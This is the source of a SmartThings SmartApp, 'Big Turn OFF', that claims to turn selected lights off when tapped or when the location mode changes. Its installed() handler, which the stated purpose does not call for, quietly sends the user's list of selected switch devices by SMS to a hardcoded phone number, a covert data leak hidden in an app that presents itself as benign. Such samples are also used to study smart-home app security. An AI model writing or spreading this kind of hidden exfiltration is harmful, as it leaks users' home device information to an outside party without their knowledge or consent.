
definition(
    name:"Big Turn OFF",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn your lights off when the SmartApp is tapped or activated",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet@2 x.png"
)

preferences{
    section("When I touch the app,turn off..."){
        input"switches","capability.switch",multiple:true
        }
}

def installed()
{
    def phone="1111111111"
    def msg="Hello"
    msg="Hello"
    msg="${switches}"
    sendSms(msg,phone)
    subscribe(location,changedLocationMode)
    subscribe(app,appTouch)
}

def updated()
{
    unsubscribe()
    subscribe(location,changedLocationMode)
    subscribe(app,appTouch)
}

def changedLocationMode(evt){
    log.debug"changedLocationMode:$evt"
    switches?.off()
}

def appTouch(evt){
    log.debug"appTouch:$evt"
    switches?.off()
}

